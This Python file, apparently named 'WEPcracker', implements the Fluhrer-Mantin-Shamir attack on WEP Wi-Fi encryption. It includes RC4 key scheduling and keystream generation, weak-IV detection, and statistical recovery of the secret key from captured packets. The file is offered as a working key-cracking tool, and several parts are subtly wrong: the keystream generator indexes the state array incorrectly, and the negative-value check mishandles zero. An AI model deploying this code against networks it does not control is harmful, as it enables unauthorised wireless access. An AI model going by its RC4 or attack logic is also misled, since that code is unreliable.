
__author__ = 'shane'

N = 256

def ksa(k):
    """
    KSA(K)
        Initialization:
        For i = 0 ... N - 1
            S[i] = i
        j = 0
        Scrambling:
        For i = 0 ... N - 1
            j = j + S[i] + K[i mod l]
            Swap(S[i], S[j])

    :param k: the byte array key (IV prepended to the secret key)
    :return: a pseudo random permutation of [0, 1, 2,..., 255]
    """
    s = [i for i in range(N)]
    j = 0
    for i in range(N):
        j = (j + s[i] + k[i % len(k)]) % N
        # Swap(s[i], s[j])
        temp = s[i]
        s[i] = s[j]
        s[j] = temp
    return s



def prga(s, datalength):
    """
    PRGA(K)
        Initialization:
        i = 0
        j = 0
        Generation Loop:
            i = i + 1
            j = j + S[i]
            Swap(S[i], S[j])
            Output z = S[S[i] + S[j]]

    :param s: a pseudo random permutation of [0, 1, 2,..., 255] generated by ksa
    :param datalength: length of the packet data (message + checksum) in bytes
    :return: a byte array to XOR the packet data with
    """
    z = []
    i = 0
    j = 0
    for x in range(datalength):
        i = (i+1) % N
        j = (j + s[i+1]) % N
        # Swap(s[i], s[j])
        temp = s[i]
        s[i] = s[j]
        s[j] = temp
        z.append(s[(s[i] + s[j]) % N])
    return z


def simulate_resolved(b, iv, encr_byte, sk):
    """

    :param b: index of the byte in the secret key we want to simulate
    :param iv: IV of the packet we're using
    :param encr_byte: First encrypted byte of the WEP packet
    :param sk: secret key
    :return: the simulated value of sk[b]
    """
    k = iv + sk
    # Perform b + 3 iterations of KSA
    s = [i for i in range(N)]
    j = 0
    for i in range(b + 3):
        j = (j + s[i] + k[i % len(k)]) % N
        # Swap(s[i], s[j])
        temp = s[i]
        s[i] = s[j]
        s[j] = temp
    # Reverse the PRGA/KSA to find the probable value of sk[b]
    # 0xAA SNAP Header should be first plaintext byte of WEP packets
    z = encr_byte ^ 0xAA
    key_byte =  s.index(z) - j - s[b + 3]
    # Will key_byte ever be negative?
    if key_byte > 0:
        return key_byte
    else:
        return key_byte + N


def weak_iv(iv, sk_len):
    """
    H1kari's method of weak IV detection from:
    http://www.dartmouth.edu/~madory/RC4/wepexp.txt

    :param iv: the iv in question
    :param sk_len: the length of the secret key (5 or 13)
    :return: true if iv is weak
    """
    x = iv[0]
    y = iv[1]
    z = iv[2]
    a = x + y
    b = (x + y) - z
    l = sk_len
    i = 0
    for B in range(l):
        if ((((0 <= a < B) or
        (a == B and b == (B + 1) * 2)) and
        (a != (B + 1) / 2 if B % 2 else 1)) or
        (a == B + 1 and (b == (B + 1) * 2 if B == 0 else 1)) or
        (x == B + 3 and y == N - 1) or
        (((x == 1 and y == (B / 2) + 1) or
        (x == (B / 2) + 2 and y == (N - 1) - x)) if (B != 0 and not (B % 2)) else 0)):
            return True
    return False


def crackWEPkey(keysize, packets):
    """
    Starting IV = (3, 255, x)
    Then for byte a of the key we need IV = (a+3, 255, x)

    """
    key = [0] * keysize
    for keybyte in range(keysize):
        counts = [0] * 256
        for p in packets[keybyte+3]:
            # construct key counts
            counts[simulate_resolved(keybyte, p[0], p[1], key)] += 1
        # key[keybyte] = index of max(counts)
        key[keybyte] = max(enumerate(counts), key=lambda x: x[1])[0]
    return key


def main():
    print("WEPcracker")

if __name__ == '__main__':
    main()